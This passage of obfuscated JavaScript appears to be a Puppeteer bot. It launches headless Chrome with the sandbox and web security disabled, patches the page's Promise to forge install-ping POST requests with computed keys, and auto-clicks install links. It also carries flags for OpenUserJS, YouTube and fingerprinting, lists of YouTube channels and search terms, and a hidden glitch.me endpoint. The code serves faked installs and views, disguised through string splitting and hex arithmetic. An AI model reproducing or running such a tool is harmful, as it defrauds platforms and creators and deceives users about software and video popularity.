                J[-0x1fd3 + -0x31 * -0x7f + -0x61 * -0x14] = this['block'], J[K >> -0x2540 + 0xc * 0xdb + 0x1afe] |= x[0x1bdc + 0x153 * 0x1 + -0x1d2c & K], this['block'] = J[0x238 * 0xb + -0x1cad + -0x455 * -0x1], K >= -0x1bb * -0x3 + 0x263f * 0x1 + -0x2b38 && (this['hashed'] || this['hash'](), J[0x3 * 0x383 + -0x1643 * 0x1 + 0xbba] = this['block'], J[-0x38 * -0x79 + -0x5 * -0x206 + 0x176 * -0x19] = J[0xeb7 * 0x1 + 0x119d + 0x2053 * -0x1] = J[0x2c * 0xd0 + -0x1 * -0x235a + 0x28 * -0x1c7] = J[-0x14c6 + 0x2065 * 0x1 + -0xb9c] = J[-0xba7 + -0x4c * 0x3d + 0x16b * 0x15] = J[-0xacb * -0x3 + 0x1164 + 0x8 * -0x638] = J[-0x26f * -0x1 + 0xd77 + 0x1 * -0xfe0] = J[-0x23e * -0x3 + 0x4 * -0x829 + 0x19f1] = J[0xfa9 * 0x1 + -0x19b7 * 0x1 + 0xa16] = J[-0xb55 * 0x3 + 0x4b2 * -0x5 + 0x3982] = J[-0x162e + -0x17ed + 0x2e25] = J[0x2023 * -0x1 + -0x1 * -0x153e + 0xaf0] = J[-0x2f9 + -0x2 * 0x97 + -0x2b * -0x19] = J[0x1 * 0xb1e + -0x138d + 0x6 * 0x16a] = J[0x1 * 0x1a18 + -0x25cb + 0xbc1] = J[-0x2 * 0x10af + -0x15af * 0x1 + 0xdc7 * 0x4] = 0x1 * 0xb3 + 0x14 * -0x1a3 + 0x2009), J[0x11 * 0x163 + -0x1ce4 + 0x55f] = this['hBytes'] << 0x95 * 0x1a + -0x13ed + 0x4ce | this['bytes'] >>> -0x16bf + -0xee8 + 0x25c4, J[0x2037 + -0x15 * 0xf8 + -0xbd0] = this['bytes'] << 0x24b9 + -0xa9f * -0x3 + -0x4493, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xf35 * -0x1 + -0xd * -0x1d5 + 0x88c * -0x1; J < 0x1 * -0x1f75 + -0x1704 + -0xff * -0x37; ++J)
                K = Q[J - (0xf0a * 0x1 + -0x93 * 0xc + -0x823)] ^ Q[J - (-0x1c6 * -0x6 + 0xe * 0x157 + -0x1d5e)] ^ Q[J - (-0x8d * -0xe + -0x82f * 0x2 + 0x8b6)] ^ Q[J - (-0x51b * -0x7 + -0x254b + 0x19e)], Q[J] = K << -0x737 + 0x18b * -0xd + 0x1b47 | K >>> -0x730 + 0x24d5 + -0xec3 * 0x2;
              for (J = 0x517 + -0x206 + -0x311; J < 0x8d8 + 0x16c3 + -0x1 * 0x1f87; J += 0x680 + -0xab0 + -0x435 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x19a8 * -0x1 + 0x156f + 0x21f * 0x2 | L >>> -0x31b * -0xb + 0x29 * -0x3d + -0x1849) + (M & N | ~M & O) + P + (0xaf4dd0a4 + -0x2dd * -0x238efe + -0xba9bc451) + Q[J] << -0xd1a + 0xb5 * 0x22 + 0x10 * -0xaf) << -0x1f3f + -0xa36 * -0x3 + -0x1 * -0xa2 | P >>> 0x6d + -0xfbb + 0xf69) + (L & (M = M << 0x3 * 0x1c9 + 0x20c3 + 0x13 * -0x200 | M >>> -0x335 * 0xb + 0x114 + 0x2235) | ~L & N) + O + (-0xb1e95318 + -0x4ca28e2a + 0x1590e5adb) + Q[J + (0x12e4 + 0x1 * -0x11ed + -0x2 * 0x7b)] << -0x842 * -0x2 + 0x56d + -0x15f1) << 0x1 * 0x1a13 + -0xff3 * 0x1 + -0xa1b | O >>> -0x5 * -0x4ab + 0x61c + -0x4e4 * 0x6) + (P & (L = L << -0x72e * 0x1 + 0x5 * -0x21a + 0x11ce | L >>> -0x761 * 0x2 + 0x782 + -0x1 * -0x742) | ~P & M) + N + (0x297bd3c2 * 0x2 + -0x88c7418a + -0x9052139f * -0x1) + Q[J + (-0x110f + -0x1e5b * 0x1 + -0x14 * -0x25f)] << 0x25c9 + 0x1439 * -0x1 + -0x1190) << 0xd * 0xa3 + -0x1dd6 + -0x565 * -0x4 | N >>> -0x2247 + 0x8b * -0x11 + -0x13f * -0x23) + (O & (P = P << 0xbe1 + -0x239 + 0x98a * -0x1 | P >>> -0x1a21 + -0x1e9e + -0x1d * -0x1f5) | ~O & L) + M + (0x1 * -0xad9dd1e + 0x8f2e032 * 0x1 + -0x1cc9 * -0x335dd) + Q[J + (-0xe * -0x15b + 0x538 + 0x182f * -0x1)] << -0xbfe * -0x1 + 0x237a + -0x2f78) << 0xe7f * -0x2 + 0x11f2 * 0x2 + 0x1 * -0x6e1 | M >>> 0x18 * -0x175 + -0xfa6 + 0x32b9) + (N & (O = O << -0x25ed * 0x1 + -0x1bf1 * 0x1 + 0x41fc | O >>> -0x25e + 0x1daf + -0x1b4f) | ~N & P) + L + (0x14cadd * -0x67b + 0x4b0 * -0xc3502 + 0x50b5073 * 0x38) + Q[J + (0x2ae + 0xc75 + -0x7 * 0x229)] << 0x10da + -0x25c3 + 0x1 * 0x14e9, N = N << 0xe24 + 0x362 * 0xb + -0x2 * 0x199e | N >>> 0x25 * 0x43 + -0x209f + 0x16f2;
              for (; J < 0xf9a + -0x356 + -0xc1c; J += 0xa5 + -0x1223 + -0x1183 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x115e + -0x2432 + 0x12d9 | L >>> 0x1335 + 0x147 * -0x1d + -0x11f1 * -0x1) + (M ^ N ^ O) + P + (-0x8a9a9b26 + 0x86d1733e + 0x72a31389) + Q[J] << -0x8b * 0x15 + -0x117a + -0x1ce1 * -0x1) << 0x1d22 + -0x12cb * -0x1 + -0x2fe8 | P >>> 0x527 + 0x969 + -0xe75) + (L ^ (M = M << -0xf5f + 0x239 * 0x1 + -0x2 * -0x6a2 | M >>> 0x816 + -0x268e + 0x1e7a) ^ N) + O + (-0x21e33251 * 0x1 + 0x245 * 0x542c97 + -0x2e4c14c1) + Q[J + (0x354 + -0x34 * 0x13 + 0x89)] << 0x1ded * 0x1 + -0x2566 + -0x1 * -0x779) << -0x1e34 + 0x17b * -0x13 + 0x2a7 * 0x16 | O >>> -0x1 * 0x20b9 + -0x201 * 0x9 + 0x32dd) + (P ^ (L = L << 0x2e3 * -0x6 + 0xe39 + 0x337 | L >>> 0x1042 + -0x8e1 + -0x75f) ^ M) + N + (-0x2b218629 + -0x2bf489f6 + 0xc5effbc0) + Q[J + (-0x636 + -0x1 * -0xe9 + -0x1c5 * -0x3)] << -0x137 * -0x12 + -0x649 * -0x6 + -0x2 * 0x1dca) << 0x2574 + -0xb5 + -0x24ba | N >>> -0x863 + 0x197a + -0x10fc) + (O ^ (P = P << 0x281 + 0x1 * 0xa59 + 0x4 * -0x32f | P >>> 0x5de + -0x13 * -0x20e + -0x2ce6) ^ L) + M + (0x40d0bc2b + -0x74a65b79 * -0x1 + -0x15b * 0x341879) + Q[J + (-0x18e8 + -0x9ed + 0x22d8)] << -0x16e * 0x1a + 0xb * 0x141 + 0x39 * 0x69) << 0x5 * -0xdd + 0xbf1 + -0x79b | M >>> -0x31 * 0x2 + 0x234e + -0x3 * 0xb9b) + (N ^ (O = O << 0x2177 * 0x1 + 0x1 * -0x21ca + -0x71 * -0x1 | O >>> -0x1 * -0x1b1d + -0x24f3 + 0x348 * 0x3) ^ P) + L + (0x406345e5 + -0xfe785ae + 0x3e5e2b6a) + Q[J + (-0x6 * -0x303 + -0x15d5 + 0x3c7)] << -0x33f + -0x1 * -0x206d + 0x3 * -0x9ba, N = N << 0x1232 * -0x2 + 0x37 * 0x5e + -0x10 * -0x105 | N >>> 0xa7 * -0x22 + -0x38b * -0x8 + -0x628;
              for (; J < -0xabe + -0x1ad7 + 0xc9b * 0x3; J += -0x1a6 * 0x11 + 0x13c3 * 0x1 + 0x848)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x284 + -0x17 * 0xad + 0xd0c | L >>> -0x1 * -0xe71 + 0xd3 * -0x2f + 0x1867) + (M & N | M & O | N & O) + P - (0x3b9061ef * -0x2 + -0x40a80cd1 + 0x128ad13d3) + Q[J] << -0x1d * 0x135 + 0x2fa * 0x8 + 0xb31) << 0x2011 + 0x83f + 0x80f * -0x5 | P >>> 0x1 * -0x1589 + 0x1a1 * -0x17 + 0x3b1b) + (L & (M = M << -0x1e29 + 0x7 * -0x387 + 0x36f8 | M >>> 0x15b * 0x15 + -0x12 * -0x12 + -0x1db9) | L & N | M & N) + O - (0x977303 * -0x16a + 0x2 * -0x27bf6cb9 + 0x1968bbed4) + Q[J + (0x957 + 0xe0e + -0x1764)] << 0x2111 + 0xeec + 0x15 * -0x249) << 0x157c + 0x1 * -0xdf8 + -0x1 * 0x77f | O >>> -0xe41 + -0x1b04 + 0x2960) + (P & (L = L << 0x17 * -0x119 + 0x25c8 + -0xc6b | L >>> 0x2609 + -0x1 * -0x1b70 + 0x1 * -0x4177) | P & M | L & M) + N - (0x5e3e01ff + -0x16 * 0x2ad070b + 0x4d84dc17 * 0x1) + Q[J + (-0x7ae + 0x1 * 0x1a72 + -0x2 * 0x961)] << -0x1405 + -0x9 * 0x25 + -0x1552 * -0x1) << 0x33c * 0x7 + 0x3 * -0x906 + 0x473 | N >>> -0x877 + -0xd38 * -0x2 + -0x11de) + (O & (P = P << 0x3e * -0x9b + 0x1a9d + 0x101 * 0xb | P >>> -0x1 * 0x1d1c + 0x7 * -0x16a + 0xb * 0x38c) | O & L | P & L) + M - (-0x7c7 * -0x169d8b + 0x3 * 0x24746026 + -0xac5c215b) + Q[J + (0x2 * 0x8d1 + -0x1dac + 0xc0d * 0x1)] << -0x81e + 0x1a9 * -0x2 + 0xb70) << 0x17d9 + -0x1845 + 0x71 | M >>> 0x27b * 0xb + 0x155 + -0x981 * 0x3) + (N & (O = O << 0x8c1 + -0x1f86 * -0x1 + -0x2829 | O >>> 0xef6 + -0x22ce + 0x3 * 0x69e) | N & P | O & P) + L - (-0x1 * -0xd5da6581 + 0x1301f97 * -0x80 + -0x37aaa9 * -0xeb) + Q[J + (0x1 * 0x1042 + 0x5e7 * 0x3 + -0x21f3)] << 0x7 * 0x69 + 0x216d * -0x1 + -0x2 * -0xf47, N = N << 0x1bd1 + 0x15bf + -0x3172 | N >>> 0xce2 + 0x1161 + -0x1e41;
              for (; J < -0x26b * -0x1 + 0x35 + -0x250; J += 0x5f9 + 0x221f * 0x1 + 0x1 * -0x2813)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1122 + 0x1 * 0x2399 + -0x34b6 * 0x1 | L >>> 0x37a * -0x8 + -0xaa + -0x3 * -0x987) + (M ^ N ^ O) + P - (0x48f9182b + -0x5755cd00 + -0x9 * -0x78d8cc7) + Q[J] << 0x235d + -0x811 + -0x1b4c) << -0x1c1f + -0x1e91 * -0x1 + -0x26d | P >>> -0x18b + 0x1 * -0xd79 + 0xf1f) + (L ^ (M = M << 0x21df + -0x1 * 0x13a + -0x2087 | M >>> 0xed0 + -0x3 * 0x74f + 0x71f) ^ N) + O - (-0x1323262 + 0x16c378d9 + 0x628d * 0x533f) + Q[J + (0x183a + -0xca6 * -0x1 + -0x1 * 0x24df)] << -0x1ae5 + 0x1541 + 0x5a4) << 0xa * -0x101 + -0x129a + 0x1ca9 | O >>> -0xa3 * 0x16 + -0x2284 * -0x1 + -0x6cd * 0x3) + (P ^ (L = L << 0x26a1 + 0xe9a + -0x351d | L >>> 0xb * -0x101 + -0x272 + 0x2b3 * 0x5) ^ M) + N - (-0x2c7eb156 + 0x30014567 + 0x321aaa19) + Q[J + (0xb6 * -0x3 + 0x2 * -0xb57 + 0x18d2)] << 0x226e + -0x159 * 0x1b + -0x1f5 * -0x1) << 0x3d * -0x7a + 0x2 * -0x1b7 + -0x2085 * -0x1 | N >>> 0x690 + 0x14f4 + -0x923 * 0x3) + (O ^ (P = P << 0xae4 + 0xcd1 + -0x1797 | P >>> 0x2b7 * 0xb + 0x89 * -0x25 + -0xa0e) ^ L) + M - (0x7588d55 + -0x57a0ad7a * 0x1 + -0xd24a65 * -0xa3) + Q[J + (-0x4 * -0x5ec + -0x15bd + -0x1 * 0x1f0)] << 0x7 * 0x65 + 0x4 * -0x29 + 0xb5 * -0x3) << -0x197f * 0x1 + 0xa35 + 0xf4f * 0x1 | M >>> 0x1 * 0xa91 + -0x42 * -0x14 + 0xf9e * -0x1) + (N ^ (O = O << -0xda3 + -0x185 * 0x1 + 0xf46 | O >>> -0x1f54 + -0x57 * -0x65 + 0x2fd * -0x1) ^ P) + L - (0x22ba7344 + 0x4a * -0x1671c0b + 0x7ab0e614) + Q[J + (0x1 * 0x1829 + -0x9 * -0x185 + -0x67 * 0x5e)] << -0x210f + -0x80b + 0x291a * 0x1, N = N << 0x1ab5 + 0x1 * 0x1831 + 0x28a * -0x14 | N >>> 0x2 * 0x685 + 0x1c94 + -0x299c;
              this['h0'] = this['h0'] + L << -0x103 * -0x1a + 0xc55 + -0x9 * 0x44b, this['h1'] = this['h1'] + M << 0x1edb + -0x421 * 0x9 + -0x2 * -0x327, this['h2'] = this['h2'] + N << 0x1729 * -0x1 + -0x33d * 0x1 + 0x6d * 0x3e, this['h3'] = this['h3'] + O << 0x1fd1 + 0x197 * 0x5 + 0x2 * -0x13e2, this['h4'] = this['h4'] + P << 0x373 * 0x6 + 0xf13 + -0x23c5;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xc93 + 0x8cb * 0x2 + -0x4e7 & 0x58c * -0x1 + 0x251c + -0x1f81] + w[J >> 0xdeb + -0xeaf + -0x6e * -0x2 & 0x24a9 + 0x1d2 * 0x3 + -0x8 * 0x542] + w[J >> 0x12bf + 0x9eb * 0x1 + -0x1c96 & 0x76d * -0x2 + 0x257b + -0x1692] + w[J >> -0x4 * 0x2ba + -0x22c * 0x9 + -0x7c * -0x3f & -0x604 * -0x5 + 0x3e5 * -0x1 + -0x1a20] + w[J >> 0x1a5 + 0x1b07 + -0x1ca0 & -0x262c + 0x1835 + -0xa * -0x167] + w[J >> -0x48 * -0x60 + 0x1fc7 + -0x3abf & -0x1 * 0x297 + -0xcbe + 0xf64] + w[J >> -0x19b * -0xd + -0x6a + -0x1471 & -0x657 * -0x1 + 0x2552 + -0x2b9a] + w[-0xbb4 + -0x7e2 * -0x2 + -0x401 & J] + w[K >> 0x1906 * -0x1 + -0x183f + 0x3161 & 0x1 * 0x679 + 0x2469 + -0x2ad3] + w[K >> -0x11 * 0x1e5 + -0x1e1c + 0x4cd * 0xd & 0x1eb * 0x3 + -0xd9d + 0x7eb] + w[K >> -0x173a + -0x2 * -0x371 + 0x106c & 0xa8b * 0x3 + 0x1e2a + -0x525 * 0xc] + w[K >> 0x1c08 + 0x4 * 0x4fd + -0xbfb * 0x4 & -0xace * 0x1 + -0x13 * -0x4f + 0x500] + w[K >> -0x9dd * 0x2 + 0x1267 + -0x1 * -0x15f & 0x18f1 + 0x13bc + -0x1 * 0x2c9e] + w[K >> -0x15d3 * -0x1 + 0x1c3f + 0x69 * -0x7a & 0xb6c * -0x2 + 0x9 * 0x185 + -0x1 * -0x93a] + w[K >> 0x1e40 + 0x218 * 0x7 + -0x2ce4 & -0x47 * -0x1d + 0xbf5 * -0x1 + 0x3f9] + w[0x46 * 0xf + 0x11d8 + -0x15e3 & K] + w[L >> -0x8 * 0x74 + 0x314 + -0xe * -0xc & 0x7f3 + -0x8f8 + 0x2 * 0x8a] + w[L >> -0xac * -0x2b + -0x216b + 0x49f & -0x3 * 0x79d + -0x1e28 + 0x2 * 0x1a87] + w[L >> 0x2099 * -0x1 + -0x1 * 0xdcd + 0x2e7a & 0x25ec + 0xcc6 + -0x32a3] + w[L >> -0x705 + 0x1 * -0x5c9 + 0xcde & -0x68 + 0x3 * 0xc4f + 0x1a * -0x167] + w[L >> 0x67e + 0x15e7 + -0x973 * 0x3 & 0x1 * 0x98f + -0x1e98 + 0x384 * 0x6] + w[L >> -0x5 * 0x25 + 0x17 * 0xe5 + 0x1 * -0x13d2 & -0x713 + -0x26a5 + 0x1 * 0x2dc7] + w[L >> 0x18bf * 0x1 + -0x1 * -0x1e38 + 0x1 * -0x36f3 & -0x194d + 0xc2a + 0xd32] + w[0x432 + -0x102b * -0x2 + -0x2479 & L] + w[M >> 0xdee + 0x1 * -0x52f + -0x8a3 & -0x1ef * 0xe + -0xafd + 0x261e] + w[M >> -0x190a + 0x19f5 + 0x1 * -0xd3 & 0xf * -0x1b3 + -0x15f7 + 0x2f83] + w[M >> -0x2 * -0x34d + -0x55d * 0x1 + 0x3 * -0x63 & -0x6 * -0x201 + 0x14 * 0x1d0 + -0x3037] + w[M >> 0x1d8a + -0x158e + -0x1a * 0x4e & -0x3c * 0x95 + -0x9 * 0x76 + 0x2721 * 0x1] + w[M >> -0xfab + -0x22 * 0xec + -0x6b9 * -0x7 & -0x2c * -0x2b + -0x1740 + -0xfeb * -0x1] + w[M >> -0x7 * -0x4ff + -0x1082 * 0x1 + -0x27 * 0x79 & -0x11d6 * -0x2 + 0x1d0b + -0x40a8 * 0x1] + w[M >> 0x1984 + 0x97d + -0x22fd & -0x2 * 0x9aa + 0x161b * 0x1 + -0x18 * 0x1d] + w[-0xa29 * -0x1 + -0x21f2 + 0x1b4 * 0xe & M] + w[N >> 0x1e73 * 0x1 + 0xae8 + 0x1 * -0x293f & 0xe * -0xd8 + 0x1 * -0x16f + 0x1a * 0x83] + w[N >> 0x1 * 0x24a6 + 0xc3f + -0x30cd & -0x1440 + 0x1611 + -0x1c2] + w[N >> -0xdb + -0x1 * 0x243d + -0x6 * -0x632 & 0x1 * 0x1e11 + 0xc44 + -0x2 * 0x1523] + w[N >> 0x30f * -0x1 + -0x1 * -0x1759 + 0x35f * -0x6 & -0x8bd + 0x11b4 * -0x2 + -0x5c * -0x7b] + w[N >> 0x4c * -0x63 + 0x1bf0 + -0x4 * -0x60 & 0x1613 + 0x106 * -0xc + -0x9bc] + w[N >> -0x10eb + 0x1f9f + -0xeac & -0x96f + -0x1f3 * -0x1 + 0x78b] + w[N >> -0x1 * -0x4e1 + -0x7d9 * -0x1 + -0x1 * 0xcb6 & 0x208f + 0x3 * 0x4b3 + 0x4f * -0x97] + w[0xa3e + 0xd7b + -0x17aa & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xf65 + 0x25b3 + -0x6a0 * 0x8 & -0x16df + 0x1cb6 + -0x9b * 0x8,
                J >> -0x37 * -0x4a + -0x2a * 0xe6 + -0x2 * -0xaf3 & 0x66b + -0x1 * -0x33b + -0x8a7,
                J >> -0x1c * 0xba + 0xb1 * 0x13 + 0x73d & 0x2 * -0x1b7 + 0x1741 + -0x1e2 * 0xa,
                -0x8 * 0x342 + -0x2197 + -0x1 * -0x3ca6 & J,
                K >> 0xf65 + 0x1522 + -0x246f & -0x1 * -0x2133 + -0x1f0c + -0x128,
                K >> 0x14f2 * -0x1 + 0x13bc + -0x2 * -0xa3 & -0xbb + -0x1248 + -0x1402 * -0x1,
                K >> 0x1672 + -0x1f1f + 0x8b5 & 0xc3c + -0x2095 + -0x1 * -0x1558,
                -0x4bf + 0x1fa3 + -0x3b3 * 0x7 & K,
                L >> -0x1a78 + -0xc2 * -0xb + 0x123a & 0xee4 + -0xe2a + 0x45,
                L >> -0x211 * 0x12 + -0x7e7 + 0x1 * 0x2d29 & 0x1a5 + -0x6 * -0x12f + -0x7c0,
                L >> 0x7cb + 0x27 * -0x1f + -0x30a & 0x1c3 + 0x18b0 + -0x1974,
                0x1 * -0x1307 + 0x1487 + -0x81 & L,
                M >> 0x2 * -0x85d + 0x2 * 0x5ec + 0x2 * 0x27d & -0x19ed + -0x221 + 0x1d0d,
                M >> 0x724 + 0x664 * -0x5 + -0xc7 * -0x20 & 0x14bf + 0x1b5 + 0x1 * -0x1575,
                M >> 0x1965 * -0x1 + 0x179 * 0xd + -0xc9 * -0x8 & -0x1 * 0x170f + -0x58d + 0x1d9b,
                -0x10 * -0x24a + 0x27f + -0x2620 & M,
                N >> 0x1ba5 + -0x1 * -0x1085 + -0x2c12 & -0x152d + 0x24bc + -0xe90,
                N >> 0xb95 + -0x5b5 * -0x6 + -0x21 * 0x163 & 0xe52 + -0x1fd6 + 0x1283,
                N >> 0x23f * 0xa + 0x1 * 0x26d1 + -0x1 * 0x3d3f & 0x161 * 0xd + 0x1521 + 0x260f * -0x1,
                -0x2175 + 0x158c + 0x2 * 0x674 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x6e3 + -0x83 * 0x3 + -0x12 * 0x4b), (K = new DataView(J))['setUint32'](0xc * 0x149 + 0xae * 0x20 + 0x4 * -0x94b, this['h0']), K['setUint32'](0x1 * -0x1db4 + 0x220a + -0xe * 0x4f, this['h1']), K['setUint32'](0x1f8b + -0x59a * -0x1 + -0x251d, this['h2']), K['setUint32'](-0xdae * -0x2 + -0x136d + -0x3 * 0x2a1, this['h3']), K['setUint32'](0xf5 + -0x11d8 + 0x10f3, this['h4']), J;
            }
        }
        G['prototype'][W(0x1b)] = G['prototype']['hex'], G['prototype'][W(0x10)] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x226f + 0x1805 + -0x3a74];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1 * 0x22e1 + -0xec7 + -0x141a;
            J[-0xa6 + -0x1417 + -0x1 * -0x14bd]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x14e1 + 0x383 * 0x9 + -0x347c] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x515 + -0x25dd + -0xf * -0x2dd), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x16e8 + -0x2549 + 0x3c32;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x4d * -0x6b + 0x12e + 0x24dd * 0x1), Promise['resolve'](0x21a + 0xc43 + -0xe5c);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x56 + -0x1 * 0x223 + 0x1cd * 0x1; j < -0xbc2 + 0x11d1 + -0x60e; j++)
    i();
}
const NETWORK_PATIENCE = -0x1c * -0xbc + 0x14 * 0x183 + 0x1 * -0x138c + (-0x2 * -0xa39 + -0x18e + 0x4 * -0x1cb) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x6a8 + -0x74b * -0x3 + -0xf36) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1 * -0xacb + -0x1b6f + 0xe9 * 0x2a);
    let h = e[f];
    if (c['NVyGAP'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1442 * -0x1 + -0x54d * -0x1 + -0x198f, r, s, t = -0x1 * -0x21fe + -0x25 * 0x61 + 0x13f9 * -0x1; s = m['charAt'](t++); ~s && (r = q % (0xcdd * 0x1 + 0x1faf * 0x1 + -0xe4 * 0x32) ? r * (-0x5ae * -0x3 + 0x1209 + 0x5 * -0x6f7) + s : s, q++ % (0x983 + -0x2313 * 0x1 + 0x1 * 0x1994)) ? o += String['fromCharCode'](0xffb * -0x1 + 0xa7b + 0x67f & r >> (-(-0x1f57 + 0x22 * 0xd9 + 0x1 * 0x287) * q & 0x1 * -0x1bca + -0x2 * -0xda6 + 0xc * 0xb)) : 0xd93 + 0x1610 * 0x1 + -0xbe1 * 0x3) {
          s = n['indexOf'](s);
        }
        for (let u = 0x30c + 0x163f + -0x194b, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0xc * -0x27f + -0xd1e + 0x26 * -0x71))['slice'](-(0x135c + 0x15da + -0x6de * 0x6));
        }
        return decodeURIComponent(p);
      };
      c['SZsAHz'] = i, b = arguments, c['NVyGAP'] = !![];
    }
    const j = e[-0x1548 + 0x79a * 0x5 + -0x2 * 0x85d],
      k = f + j,
      l = b[k];
    return !l ? (h = c['SZsAHz'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + X(0x12, 'N4v6'),
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x10 * -0x146 + 0x9 * 0x2a7 + -0x2c3f * 0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' 